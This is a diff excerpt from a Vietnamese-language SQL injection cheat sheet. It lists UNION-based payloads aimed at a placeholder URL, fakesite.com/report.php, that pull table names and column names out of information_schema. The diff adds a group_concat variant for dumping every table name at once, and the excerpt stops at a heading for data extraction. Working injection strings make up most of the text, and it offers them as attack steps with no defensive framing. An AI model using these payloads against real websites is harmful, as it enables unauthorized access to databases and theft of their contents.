@@ -26,12 +26,16 @@
 - lấy ra tên bảng 
 ```
 http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema="tên database"-- -
+
+hoặc
+,unhex(hex(group_concat(table_name))),2 from information_schema.tables where table_schema=database()-- -
 ```
 
 -lấy ra tên cột:
 ```
 http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema='tên database" and table_name='tablenamehere'-- -
 ```
+hoặc thay đoạn lấy table =column
 
 - trích dữ liệu:
 
